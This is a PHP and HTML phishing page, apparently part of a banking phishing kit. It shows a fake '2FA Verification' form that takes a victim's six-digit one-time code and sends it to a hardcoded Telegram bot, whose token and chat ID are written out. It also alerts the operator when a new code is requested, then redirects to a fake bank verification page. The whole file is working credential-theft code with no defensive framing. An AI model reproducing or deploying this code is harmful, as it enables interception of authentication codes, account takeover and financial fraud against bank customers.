<?php
$botToken = '6627263483:AAG5WQX0ha9hsx740CwSUtkMjwDONp0Eh_w';
$chatId = '5248818941';

// Set up error message (default is empty)
$errorMessage = "";

// Handle "Send new code"
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['method']) && $_POST['method'] === 'Send new code') {
        $message = "🔁 *User requested new OTP code*\n📅 " . date("Y-m-d H:i:s");

        file_get_contents("https://api.telegram.org/bot{$botToken}/sendMessage?" . http_build_query([
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'Markdown'
        ]));

        // Reload page with cleared input
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }

    // Check submitted code
    $code = isset($_POST['twoFactAuthConfCode']) ? trim($_POST['twoFactAuthConfCode']) : '';

    if (empty($code)) {
        $errorMessage = "Code is required.";
    } elseif (!preg_match('/^\d{6}$/', $code)) {
        $errorMessage = "Code must be exactly 6 digits.";
    } else {
        // Valid code — send to Telegram
        $message = "✅ *2FA Code Submitted*\n🔢 *Code:* `{$code}`\n📅 " . date("Y-m-d H:i:s");

        file_get_contents("https://api.telegram.org/bot{$botToken}/sendMessage?" . http_build_query([
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'Markdown'
        ]));

        // Redirect after success
        header("Location: Bank Mobile Verification.html");
        exit;
    }
}
?>

<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>2FA Verification</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f7f7f7;
      padding: 40px;
    }
    .otp-box {
      max-width: 400px;
      margin: auto;
      padding: 25px;
      background: #fff;
      border: 1px solid #ddd;
      border-radius: 6px;
      box-shadow: 0 0 8px rgba(0,0,0,0.05);
    }
    .otp-box input[type="text"] {
      width: 100%;
      padding: 10px;
      font-size: 18px;
      text-align: center;
      margin-top: 10px;
    }
    .otp-box input[type="submit"] {
      width: 48%;
      padding: 10px;
      margin-top: 15px;
      font-size: 16px;
      cursor: pointer;
    }
    .error {
      color: red;
      font-weight: bold;
      margin-top: 10px;
      text-align: center;
    }
  </style>
</head>
<body onload="document.getElementById('twoFactAuthConfCode').focus();">
  <div class="otp-box">
    <form method="post" action="">
      <h2 style="text-align:center;">Enter Your 2FA Code</h2>

      <input type="text" name="twoFactAuthConfCode" id="twoFactAuthConfCode"
             maxlength="6" placeholder="Enter 6-digit code"
             pattern="\d{6}" required
             value="<?php echo isset($_POST['twoFactAuthConfCode']) ? htmlspecialchars($_POST['twoFactAuthConfCode']) : ''; ?>">

      <?php if (!empty($errorMessage)): ?>
        <div class="error"><?php echo $errorMessage; ?></div>
      <?php endif; ?>

      <div style="display:flex; justify-content: space-between;">
        <input type="submit" name="submitBtn4" value="Submit">
        <input type="submit" name="method" value="Send new code">
      </div>
    </form>
  </div>
</body>
</html>
